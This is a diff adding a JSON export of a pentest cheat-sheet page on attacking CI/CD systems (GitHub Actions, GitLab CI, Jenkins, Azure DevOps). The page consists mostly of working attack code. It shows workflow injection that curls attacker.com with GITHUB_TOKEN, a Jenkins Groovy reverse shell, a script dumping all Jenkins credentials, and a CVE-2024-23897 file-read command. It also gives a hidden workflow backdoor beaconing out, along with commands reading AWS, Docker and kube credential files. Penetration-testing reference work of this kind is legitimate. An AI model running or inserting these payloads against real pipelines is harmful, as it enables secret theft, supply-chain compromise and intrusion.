@@ -1,0 +1,467 @@
+{
+    "title": "CI/CD Security",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Attack Surface",
+            "type": "code_block",
+            "content": [
+                "CI/CD systems are high-value targets because they:",
+                "- Have access to source code",
+                "- Store secrets (API keys, credentials)",
+                "- Can deploy to production",
+                "- Often have elevated cloud permissions",
+                "- Trust code from repositories"
+            ]
+        },
+        {
+            "heading": "GitHub Actions",
+            "subheadings": [
+                {
+                    "heading": "Secrets Extraction",
+                    "type": "code_block",
+                    "content": [
+                        "# Secrets accessible via ${{ secrets.NAME }}",
+                        "# Check for exposed secrets in logs",
+                        "",
+                        "steps:",
+                        "  - name: Expose secrets (malicious)",
+                        "    run: |",
+                        "      echo \"${{ secrets.AWS_ACCESS_KEY }}\" | base64",
+                        "      env | base64",
+                        "      cat $GITHUB_ENV"
+                    ]
+                },
+                {
+                    "heading": "Workflow Injection",
+                    "type": "code_block",
+                    "content": [
+                        "# If workflow uses untrusted input in run: commands",
+                        "# Example: PR title injection",
+                        "",
+                        "name: Vulnerable Workflow",
+                        "on:",
+                        "  pull_request:",
+                        "    types: [opened]",
+                        "",
+                        "jobs:",
+                        "  greet:",
+                        "    runs-on: ubuntu-latest",
+                        "    steps:",
+                        "      - run: |",
+                        "          echo \"PR Title: ${{ github.event.pull_request.title }}\"",
+                        "          # Attacker sets PR title to: \"; curl attacker.com/steal?token=$GITHUB_TOKEN\""
+                    ]
+                },
+                {
+                    "heading": "GITHUB_TOKEN Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "# GITHUB_TOKEN has repo access by default",
+                        "# Can be used for:",
+                        "# - Push to repo (if not protected)",
+                        "# - Create issues/PRs",
+                        "# - Access private packages",
+                        "# - Read other private repos (in org)",
+                        "",
+                        "# Check permissions",
+                        "curl -H \"Authorization: token $GITHUB_TOKEN\" \\",
+                        "  https://api.github.com/repos/owner/repo",
+                        "",
+                        "# Exfiltrate repo content",
+                        "git clone https://x-access-token:${GITHUB_TOKEN}@github.com/org/private-repo.git"
+                    ]
+                },
+                {
+                    "heading": "Self-Hosted Runner Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Self-hosted runners may have:",
+                        "# - Access to internal network",
+                        "# - Cached credentials",
+                        "# - Persistent storage between jobs",
+                        "",
+                        "steps:",
+                        "  - name: Explore runner",
+                        "    run: |",
+                        "      # Check for cached credentials",
+                        "      find /home -name \"*.pem\" -o -name \"credentials\" 2>/dev/null",
+                        "      cat ~/.aws/credentials",
+                        "      cat ~/.docker/config.json",
+                        "      ",
+                        "      # Network enumeration",
+                        "      ip addr",
+                        "      cat /etc/hosts",
+                        "      nmap -sn 10.0.0.0/24"
+                    ]
+                },
+                {
+                    "heading": "Poisoned Pipeline Execution (PPE)",
+                    "type": "code_block",
+                    "content": [
+                        "Direct PPE: Attacker modifies workflow file",
+                        "Indirect PPE: Attacker modifies code that workflow executes",
+                        "",
+                        "Attack vectors:",
+                        "1. Compromised PR from fork",
+                        "2. Compromised dependency",
+                        "3. Injected build scripts"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "GitLab CI",
+            "subheadings": [
+                {
+                    "heading": "Variable Extraction",
+                    "type": "code_block",
+                    "content": [
+                        "# .gitlab-ci.yml",
+                        "stages:",
+                        "  - exploit",
+                        "",
+                        "dump_vars:",
+                        "  stage: exploit",
+                        "  script:",
+                        "    - printenv | base64",
+                        "    - cat $CI_PROJECT_DIR/.gitlab-ci.yml",
+                        "    - echo $CI_JOB_TOKEN"
+                    ]
+                },
+                {
+                    "heading": "Runner Token Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "# CI_JOB_TOKEN can:",
+                        "# - Clone repos in same group",
+                        "# - Push to container registry",
+                        "# - Access package registry",
+                        "",
+                        "# Clone private repo",
+                        "git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.com/group/private-repo.git",
+                        "",
+                        "# Push to registry",
+                        "docker login -u gitlab-ci-token -p $CI_JOB_TOKEN registry.gitlab.com",
+                        "docker push registry.gitlab.com/group/project/image:tag"
+                    ]
+                },
+                {
+                    "heading": "Protected vs Unprotected Variables",
+                    "type": "code_block",
+                    "content": [
+                        "# Protected variables only available on protected branches",
+                        "# Test from unprotected branch to see what's accessible",
+                        "",
+                        "test:",
+                        "  script:",
+                        "    - echo \"Protected var: $PROD_API_KEY\"  # May be empty",
+                        "    - echo \"Unprotected var: $DEV_API_KEY\"  # Accessible"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Jenkins",
+            "subheadings": [
+                {
+                    "heading": "Script Console RCE",
+                    "type": "code_block",
+                    "content": [
+                        "// If you have access to /script console",
+                        "// Full Groovy execution",
+                        "",
+                        "def cmd = \"id\"",
+                        "def sout = new StringBuffer(), serr = new StringBuffer()",
+                        "def proc = cmd.execute()",
+                        "proc.consumeProcessOutput(sout, serr)",
+                        "proc.waitForOrKill(1000)",
+                        "println \"out> $sout\\nerr> $serr\"",
+                        "",
+                        "// Reverse shell",
+                        "def cmd = [\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/attacker/4444 0>&1\"]",
+                        "cmd.execute()"
+                    ]
+                },
+                {
+                    "heading": "Credentials Extraction",
+                    "type": "code_block",
+                    "content": [
+                        "// Dump all credentials from Jenkins",
+                        "import jenkins.model.*",
+                        "import com.cloudbees.plugins.credentials.*",
+                        "import com.cloudbees.plugins.credentials.impl.*",
+                        "",
+                        "def creds = CredentialsProvider.lookupCredentials(",
+                        "    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,",
+                        "    Jenkins.instance,",
+                        "    null,",
+                        "    null",
+                        ")",
+                        "",
+                        "for (c in creds) {",
+                        "    println(c.id + \": \" + c.username + \" / \" + c.password)",
+                        "}"
+                    ]
+                },
+                {
+                    "heading": "Pipeline Secrets in Logs",
+                    "type": "code_block",
+                    "content": [
+                        "// Secrets may leak in build logs",
+                        "pipeline {",
+                        "    agent any",
+                        "    environment {",
+                        "        SECRET = credentials('secret-id')",
+                        "    }",
+                        "    stages {",
+                        "        stage('Build') {",
+                        "            steps {",
+                        "                // This may print masked secret",
+                        "                sh 'echo $SECRET'",
+                        "                // This may leak it",
+                        "                sh 'printenv | grep -i secret'",
+                        "            }",
+                        "        }",
+                        "    }",
+                        "}"
+                    ]
+                },
+                {
+                    "heading": "CVE-2024-23897 (File Read)",
+                    "type": "code_block",
+                    "content": [
+                        "# Jenkins CLI arbitrary file read",
+                        "# Affects Jenkins < 2.442, LTS < 2.426.3",
+                        "",
+                        "java -jar jenkins-cli.jar -s http://jenkins:8080/ help '@/etc/passwd'",
+                        "",
+                        "# Or via HTTP",
+                        "curl 'http://jenkins:8080/cli?remoting=false' \\",
+                        "  -d '<jenkins><arg>help</arg><arg>@/etc/passwd</arg></jenkins>'"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Azure DevOps",
+            "subheadings": [
+                {
+                    "heading": "Variable Groups",
+                    "type": "code_block",
+                    "content": [
+                        "# azure-pipelines.yml",
+                        "variables:",
+                        "  - group: production-secrets  # Links variable group",
+                        "",
+                        "steps:",
+                        "  - script: |",
+                        "      echo \"$(PROD_PASSWORD)\"  # Access secrets",
+                        "    displayName: 'Access secrets'"
+                    ]
+                },
+                {
+                    "heading": "Service Connection Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "# If pipeline has access to service connections",
+                        "# Can deploy/access cloud resources",
+                        "",
+                        "- task: AzureCLI@2",
+                        "  inputs:",
+                        "    azureSubscription: 'Production'",
+                        "    scriptType: 'bash'",
+                        "    scriptLocation: 'inlineScript'",
+                        "    inlineScript: |",
+                        "      az account show",
+                        "      az keyvault secret list --vault-name prod-vault"
+                    ]
+                },
+                {
+                    "heading": "Agent Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Self-hosted agents may have cached credentials",
+                        "steps:",
+                        "  - script: |",
+                        "      cat ~/.azure/credentials",
+                        "      cat ~/.kube/config",
+                        "      env | grep -i azure"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Artifact Poisoning",
+            "subheadings": [
+                {
+                    "heading": "Dependency Confusion",
+                    "type": "code_block",
+                    "content": [
+                        "# Register internal package names on public registry",
+                        "# When CI runs `npm install`, it may fetch malicious public package",
+                        "",
+                        "# Check for vulnerable packages",
+                        "# 1. Find internal package names (package.json, requirements.txt)",
+                        "# 2. Check if name exists on public registry",
+                        "# 3. If not, register it with malicious code"
+                    ]
+                },
+                {
+                    "heading": "Build Cache Poisoning",
+                    "type": "code_block",
+                    "content": [
+                        "# If build cache is shared between projects",
+                        "# Poisoned cache can inject malicious artifacts",
+                        "",
+                        "# Example: npm cache poisoning",
+                        "- name: Setup Node with cache",
+                        "  uses: actions/setup-node@v3",
+                        "  with:",
+                        "    cache: 'npm'  # Shared cache may be poisoned"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Container Registry Attacks",
+            "type": "code_block",
+            "content": [
+                "# Push malicious image to internal registry",
+                "# If CI pulls by tag (not digest), can be replaced",
+                "",
+                "# Push malicious image",
+                "docker tag malicious:latest registry.internal.com/app:v1.0",
+                "docker push registry.internal.com/app:v1.0",
+                "",
+                "# CI job pulls compromised image",
+                "docker pull registry.internal.com/app:v1.0"
+            ]
+        },
+        {
+            "heading": "Post-Exploitation",
+            "subheadings": [
+                {
+                    "heading": "Lateral Movement",
+                    "type": "code_block",
+                    "content": [
+                        "# From compromised CI runner:",
+                        "",
+                        "# Find other repos/projects",
+                        "curl -H \"Authorization: token $GITHUB_TOKEN\" \\",
+                        "  \"https://api.github.com/orgs/company/repos?type=all\"",
+                        "",
+                        "# Access cloud resources",
+                        "aws sts get-caller-identity",
+                        "az account list",
+                        "gcloud projects list",
+                        "",
+                        "# Pivot to internal services",
+                        "nmap -sn 10.0.0.0/24",
+                        "curl http://internal-service.local/"
+                    ]
+                },
+                {
+                    "heading": "Persistence",
+                    "type": "code_block",
+                    "content": [
+                        "# Add backdoor to workflow",
+                        "# Hidden in test or setup step",
+                        "",
+                        "- name: Setup environment",
+                        "  run: |",
+                        "    # Legitimate setup",
+                        "    npm install",
+                        "    ",
+                        "    # Hidden backdoor",
+                        "    curl -s https://attacker.com/beacon?repo=$GITHUB_REPOSITORY &"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Detection & Defense",
+            "type": "code_block",
+            "content": [
+                "Monitor for:",
+                "1. Unusual secrets access patterns",
+                "2. Modified workflow files",
+                "3. New self-hosted runners",
+                "4. Unexpected network connections from runners",
+                "5. Build artifact changes",
+                "6. Service connection usage spikes"
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# CI/CD attack tools",
+                "",
+                "# nord-stream - GitLab/GitHub secrets extraction",
+                "https://github.com/AhmedMohamedDev/nord-stream",
+                "",
+                "# Gato - GitHub attack toolkit",
+                "https://github.com/AhmedMohamedDev/gato",
+                "",
+                "# pwn-pipeline - Pipeline exploitation",
+                "https://github.com/AhmedMohamedDev/pwn-pipeline",
+                "",
+                "# Nuclei CI/CD templates",
+                "nuclei -t http/exposures/configs/jenkins-config.yaml"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "GitLab - GitLab specific attacks",
+                "Supply Chain - Dependency attacks",
+                "Cloud - CI/CD often has cloud access"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/ci-cd-security.md",
+        "previous_page": {
+            "title": "Sharepoint",
+            "url": "/enumeration/webservices/sharepoint"
+        },
+        "next_page": {
+            "title": "SaaS Testing",
+            "url": "/enumeration/webservices/saas-testing"
+        }
+    }
+}
